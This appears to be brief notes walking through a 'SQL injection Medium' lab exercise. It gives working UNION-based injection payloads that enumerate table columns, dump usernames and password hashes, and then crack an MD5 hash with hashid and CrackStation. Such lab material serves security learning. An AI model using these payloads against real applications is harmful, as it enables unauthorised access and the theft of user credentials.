## SQL injection Medium

1. Get  Error
`SELECT first_name, last_name FROM users WHERE user_id = '''`

2. Get the number of columns
`1 order by 2`

3. Get columns from user table
`1 UNION SELECT table_name, column_name FROM information_schema.columns WHERE table_name like 'user%'#`

4. Get id & pwd
`1 UNION SELECT user, password FROM users#`

5. Crack the password
`hashid 5f4dcc3b5aa765d61d8327deb882cf99`
crackstation


